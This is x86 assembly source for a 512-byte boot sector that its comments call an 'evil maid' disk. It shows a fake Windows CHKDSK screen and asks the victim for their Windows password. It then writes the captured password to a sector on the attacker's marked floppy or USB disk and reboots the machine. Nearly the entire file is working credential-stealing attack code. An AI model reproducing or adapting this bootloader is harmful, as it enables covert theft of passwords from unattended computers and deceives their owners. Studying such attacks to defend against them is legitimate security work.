[BITS 16]
[ORG 0x7C00]
jmp start
disknum db 0x99 ; now the first four bytes are E9 81 01 99 so we can find the disk we booted from
                ; we also reuse this spot in memory for the disk we identified as the boot disk

%macro biosprint 1 ; A nice wrapper
mov si, %1
call puts
%endmacro

; print a string - expects that SI is pointing at our string
puts:
  lodsb
  cmp BYTE al, 0
  je puts_end
    call putc
    jmp puts
  puts_end:
    ret

; print a char to screen - used by puts
putc:
  mov ah, 0x0E
  mov bx, 0x11
  int 0x10
  ret

; Busy wait, waits about a second on my Atom notebook
sleep:
  mov eax, dword 0xffffffff
  top:
    cmp eax, 0x00
    je sleep_end
    dec eax
    jmp top
  sleep_end:
    ret

; Assumes that dl is the disk we want to try
; 0x00 = first floppy
; 0x01 = second floppy
; 0x80 = first hard disk
; 0x81 = second hard disk
; Does not check CD-ROM, because we can't write back to it anyways
; Loads first sector, and if successful, compares the fourth byte
; (the first 3 are a jump the start of real code) against a known
; value to identify the evil maid disk. Stores dl in [disknum] if
; it finds the disk (so, if [disknum] is still 0x99, we didn't find it)
find_disk:
  mov ax, 0x201 ; I want to read, and I only want one sector
  mov dh, 0x00 ; zeroeth head
  mov cx, 0x01 ; first sector, zero-eth track
  int 0x13
  jc find_disk_end ; carry bit is set on read error
    mov al, [0x8003]
    cmp al, 0x99
    jne find_disk_end
      mov BYTE [disknum], dl
  find_disk_end:
    ret

; Strings
checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
ntfs db 13, 10, 'The type of file system is NTFS', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You', 13, 10, 'must perform this check before rebooting.', 13, 10, 13, 10,'Enter your Windows password to continue: ', 0
rmchar db 8,' ',8,0 ; this emulates the action of pressing backspace
checking db 13,10,13,10, 'Checking volume C:', 13,10,'This may take a few minutes...',0

start:
  xor ax, ax ; we just want to use absolute addresses
  mov ds, ax
  mov es, ax

  biosprint checkfs
  call sleep
  biosprint ntfs

  mov bp, 0x7E00; ; this is where we write our password, and will become the sector we write back
  keep_zeroing:
    mov [bp], BYTE 0x00
    inc bp
    cmp bp, 0x8000 ; 512 bytes from 0x7E00
    jb keep_zeroing

  mov di, 0x7E00 ; read the user's password into memory at 0x7E00
  mov cx, 0x00 ; we start out at zero characters
  readchar:
    mov ah, 0x00 ; get a character
    int 0x16
    cmp al, 13 ; ASCII code 13 is the 'Enter' key on my keyboard
    je readchar_end
    cmp al, 8  ; ASCII code 8 is the 'Backspace' key on my keyboard
    je backspace
      stosb
      mov al, '*' ; we're protecting their password from prying eyes ;)
      call putc
      inc cx
      jmp readchar
    backspace:
      cmp cx, 0
      je readchar ; don't keep backing up if there are no characters entered
        biosprint rmchar
        dec di
        mov [di], BYTE 0x00 ; blank a character from memory, remove one '*' from screen
        dec cx
        jmp readchar
    readchar_end:

  biosprint checking

  mov bx, 0x8000 ; write sector to this part of memory
  mov dl, 0x00   ; look for our disk
  call find_disk
  mov dl, 0x01
  call find_disk
  mov dl, 0x80
  call find_disk
  mov dl, 0x81
  call find_disk

  ; if we found our disk, write our blanked sector with password
  ; stored to that disk
  cmp BYTE [disknum], 0x99
  je skip_write_disk
    mov ax, 0x301; ; I want to write, and I want one sector
    mov cx, 0x01;  ; zeroeth cylinder, first sector
    mov bx, 0x7E00 ; memory location to write from
    mov dl, [disknum]
    int 0x13
  skip_write_disk:

  call sleep
  int 0x19

; make this output exactly 512 bytes long, and mark it as bootable
times 510 - ($ - $$) db 0
dw 0xAA55
